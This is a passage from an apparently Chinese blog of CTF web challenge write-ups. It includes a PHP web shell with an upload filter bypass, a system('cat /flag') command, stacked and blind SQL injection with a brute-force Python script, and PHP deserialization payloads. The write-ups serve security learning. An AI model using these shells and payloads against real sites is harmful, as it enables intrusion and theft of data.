<p>再看第四个if<br><code>if (!is_numeric($passwd))</code><br>is_numeric()函数是检测是否为数字字符，是则ture<br>这里为!is_numeric()，就是不能全为数字字符<br>同时我们看向第五个if<br><code>if($passwd==1234567)</code><br>与第四个if相反，要同时满足两个if条件才能获得flag<br>先试着把1234567转化为16进制<br>passwd&#x3D;12D687<br>提交后只绕过了第四个if，不行<br>百度一下发现<br><img src="/images/20210407185102246.png" srcset="/img/loading.gif" lazyload><br>passwd:1234567%00<br>passwd:1234567%20<br>成功得到flag<br><img src="/images/CJBVJ1.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>进入页面，先查看源代码，发现源代码里有注释you are not admin<br>flag应该在admin中，看到右边有register和login，先随便注册一个看看什么效果<br>登录进去发现多了几个选项<br><img src="/images/GK.png" srcset="/img/loading.gif" lazyload></p>
<p>挨个查看源代码<br><img src="/images/9DRO.png" srcset="/img/loading.gif" lazyload><br>发现在change password中的源代码与其他不同，显示了一个github网址，进入查看网页竟然不存在，那就换一种方法，register注册一个admin，显示已被注册，那么我们试试直接login admin，密码随意，竟然成功了<br><img src="/images/9WKWG.png" srcset="/img/loading.gif" lazyload><br>成功显示flag，后续会跟进其他方法</p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>先上传一个.user.ini 内容为auto_prepend_file&#x3D;12.txt<br>上传失败，显示exif_imagetype:not image!，没有图像，那么我们使用文件幻术头绕过<br><img src="/images/1UZPE.png" srcset="/img/loading.gif" lazyload><br>再次上传，成功<br><img src="/images/VT8D.png" srcset="/img/loading.gif" lazyload><br>再上传一个常用的木马文件<br>上传错误，显示&lt;? in contents!<br>屏蔽了一些符号导致无法上传<br>换种方法上传<br><img src="/images/8BNM.png" srcset="/img/loading.gif" lazyload><br>这次成功上传<br><img src="/images/G3.png" srcset="/img/loading.gif" lazyload><br>进入给出的地址<br>先输入a&#x3D;phpinfo()试试能不能运行命令<br><img src="/images/P45UMTRF.png" srcset="/img/loading.gif" lazyload><br>有回显，成功执行<br>继续post a&#x3D;system(“cat &#x2F;flag”)<br><img src="/images/U5SYBY1GKWV.png" srcset="/img/loading.gif" lazyload><br>成功显示flag</p>
<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>上传.htaccess(以jpg形式抓包修改后缀名)<br><img src="/images/8HOSK.png" srcset="/img/loading.gif" lazyload><br>上传一个木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>失败，过滤了&lt;?<br>换一种方式</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>上传成功，蚁剑连接以找到flag</p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>首先在靶机页面里他给了个github网址，进入在web&#x2F;babysqli&#x2F;html&#x2F;search.php里找到重要源码</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs awk">mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&#x27;SET NAMES UTF8&#x27;</span>);<br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pw&#x27;</span>];<br><span class="hljs-variable">$t_pw</span> = md5(<span class="hljs-variable">$password</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-regexp">//</span> echo <span class="hljs-variable">$sql</span>;<br><span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\(|\)|\=|or/&quot;</span>, <span class="hljs-variable">$name</span>))&#123;<br>	die(<span class="hljs-string">&quot;do not hack me!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>	<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>) &#123;<br>		printf(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, mysqli_error(<span class="hljs-variable">$con</span>));<br>		<span class="hljs-keyword">exit</span>();<br>	&#125;<br>	<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-regexp">//</span> echo <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>;<br>		<span class="hljs-variable">$arr</span> = mysqli_fetch_row(<span class="hljs-variable">$result</span>);<br>		<span class="hljs-regexp">//</span> print_r(<span class="hljs-variable">$arr</span>);<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>			<span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$password</span>) == <span class="hljs-variable">$arr</span>[<span class="hljs-number">2</span>])&#123;<br>				echo <span class="hljs-variable">$flag</span>;<br>			&#125;<br>			<span class="hljs-keyword">else</span>&#123;<br>				die(<span class="hljs-string">&quot;wrong pass!&quot;</span>);<br>			&#125;<br>		&#125;<br>		<span class="hljs-keyword">else</span>&#123;<br>			die(<span class="hljs-string">&quot;wrong user!&quot;</span>);<br>		&#125;<br>	&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>输入万能钥匙1’ or 1&#x3D;1#显示do not hack me 与上面对应，限制了or</p>
<p>抓包<br><img src="/images/L64.png" srcset="/img/loading.gif" lazyload><br>这里显示wrong user!<br>挨个试试1，2，3的位置，把它们改为’admin’，在2位置时回显发生了改变<br><img src="/images/N7R0.png" srcset="/img/loading.gif" lazyload><br>wrong pass!<br>跳过了user，那么3的位置就是password了<br>注意到上面的代码if中有MD5，使if成立<br>设密码为abc，MD5加密后为：900150983cd24fb0d6963f7d28e17f72<br><img src="/images/Y276WNW.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>输入  <code>1&#39;;show tables;#</code><br><img src="/images/LG.png" srcset="/img/loading.gif" lazyload><br>根据字面意思，flag应该在FlagHere里<br>输入  <code>1&#39;;cat FlagHere</code><br>没有显示</p>
<p>联合注入<br>输入  <code>1&#39;;select from FlagHere;#</code><br><img src="/images/IR6X2.png" srcset="/img/loading.gif" lazyload><br>显示了被过滤掉的内容</p>
<p>尝试双写绕过<br><code>1&#39;;sselectelect from FlagHere</code><br>不通过</p>
<p>尝试大小写绕过<br><code>1&#39;;sElECt from FlagHere;#</code><br>同样不通过</p>
<h4 id="handler语法"><a href="#handler语法" class="headerlink" title="handler语法"></a>handler语法</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">handler</span>语句，一行一行的浏览一个表中的数据。<br><span class="hljs-keyword">handler</span>语句并不具备<span class="hljs-keyword">select</span>语句中的所有功能。<br>mysql专用的语句，并没有包含到<span class="hljs-keyword">sql</span>标准中。<br><span class="hljs-keyword">handler</span>语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表<br></code></pre></td></tr></table></figure>

<ol>
<li>HANDLER tbl_name OPEN<br>打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。</li>
<li>HANDLER tbl_name READ FIRST<br>获取句柄的第一行，通过READ NEXT依次获取其它行，ui后一行执行之后再执行NEXT会返回一个空的结果。</li>
<li>HANDLER tbl_name CLOSE<br>关闭打开的句柄</li>
<li>HANDLER tbl_name READ index_name&#x3D;value<br>通过索引列指定一个值，可以指定从哪一行开始，通过NEXT继续浏览。</li>
</ol>
<p>输入</p>
<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><span class="hljs-number">1</span>&#x27;;handler FlagHere <span class="hljs-keyword">open</span>;handler FlagHere <span class="hljs-keyword">read</span> first;handler FlagHere <span class="hljs-keyword">close</span><span class="hljs-comment">;#</span><br></code></pre></td></tr></table></figure>

<p><img src="/images/Q560M.png" srcset="/img/loading.gif" lazyload><br>成功</p>
<h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>经过分析，这个题目需要传入一个序列化之后的类对象，并且要绕过两层防护：</p>
<p><strong>两个防护</strong></p>
<p><strong>is_valid()</strong><br>要求我们传入的str的每个字母的ascli值在32和125之间。因为protected属性在序列化之后会出现不可见字符\00*\00,不符合上面的要求。</p>
<p><strong>绕过方法：</strong>因为php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符。</p>
<p><strong>destruct()魔术方法</strong><br>op&#x3D;&#x3D;&#x3D;”2”，是强比较</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">function __destruct() &#123;<br>        <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            $<span class="hljs-keyword">this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        $<span class="hljs-keyword">this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        $<span class="hljs-keyword">this</span>-&gt;process();<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>而在process()函数中，op&#x3D;&#x3D;”2”是弱比较</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> function process() &#123;<br>        <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            $<span class="hljs-keyword">this</span>-&gt;write();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            $res = $<span class="hljs-keyword">this</span>-&gt;read();<br>            $<span class="hljs-keyword">this</span>-&gt;output($res);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $<span class="hljs-keyword">this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure>

<p>所以可以使传入的op为数字2，从而使第一个强比较返回false，而使第二个弱比较返回true</p>
<p><strong>本地进行序列化操作</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br> <br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;1&quot;</span>;        <span class="hljs-comment">//因为destruce函数会将content改为空，所以content的值随意（但是要满足is_valid()函数的要求）</span><br>&#125;<br> <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>序列化结果：<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;&#125;</code></p>
<p>payload:<code>?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;&#125;</code></p>
<p>查看源码找到flag</p>
<p>也可以使用伪协议</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;2&quot;</span>;<br> <br>&#125;<br> <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>使用过base64解码得到flag</p>
<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>All You Want Is In Table ‘flag’ and the column is ‘flag’<br>确定表和字段</p>
<p>随便输入<br>查询1，2会有回显，其它的会显示错误<br>id&#x3D;1 Hello, glzjin wants a girlfriend.<br>id&#x3D;2 Do you want to be my girlfriend?<br>输入if(true,1,2) 返回Hello, glzjin wants a girlfriend.<br>输入if(false,1,2) 返回Do you want to be my girlfriend?</p>
<p>可以用这种方法判断flag的值<br>写一个脚本(要用到time.sleep，以防出现429错误，这个脚本有个小问题就是它不能匹配<code>-</code>，所以要在空缺的地方把<code>-</code>补好，在我的机器中time.sleep()最好的设置为0.1-0.4，因为到了后面仍然不会显示<code>-</code>)<br><strong>429错误</strong>：表示客户端发送的请求过多，超出了服务器的处理能力或限制。 它是一种反应速率限制的状态码，用于告知客户端暂时无法处理请求。 在实际应用中，当收到429状态码时，客户端应该采取措施减少请求频率或优化代码，以降低服务器的负载。</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>import time<br><br><span class="hljs-attribute">s</span>=requests.session()<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,60):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;</span>:<br>        <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;http://becd3bf4-4a7a-41db-af52-6bc45f25b20e.node4.buuoj.cn:81/index.php&quot;</span><br>        <span class="hljs-attribute">sqls</span>=<span class="hljs-string">&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=ascii(&#x27;&#123;&#125;&#x27;),1,2)&quot;</span>.format(i,j)<br>        #<span class="hljs-built_in">print</span>(i)<br>        #<span class="hljs-built_in">print</span>(sqls)<br>        data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sqls&#125;<br>        c = s.post(url,<span class="hljs-attribute">data</span>=data)<br>        #<span class="hljs-built_in">print</span>(c.text)<br>        time.sleep(1.0)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Hello&#x27;</span> <span class="hljs-keyword">in</span> c.text:<br>            flag += j<br>            <span class="hljs-built_in">print</span>(i)<br>            <span class="hljs-built_in">print</span>(flag)<br>            break<br><br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure>


<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>看到注册首先想到了存储型xss，一顿x返回的PHPSESSID并没有什么用<br>正常注册blog就填<code>www.baidu.com</code>把<br>自动跳转到下一个页面后，可以发现username是一个超链接<br>点击进入</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://c5d58095-<span class="hljs-number">7</span>b7c-<span class="hljs-number">4</span>cad-b014-<span class="hljs-number">237</span>ca4cccdcf.node4.buuoj.cn:<span class="hljs-number">81</span>/view.php?no=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>疑似SQL注入<br>过滤了union select,用union all select绕过<br>payload:</p>
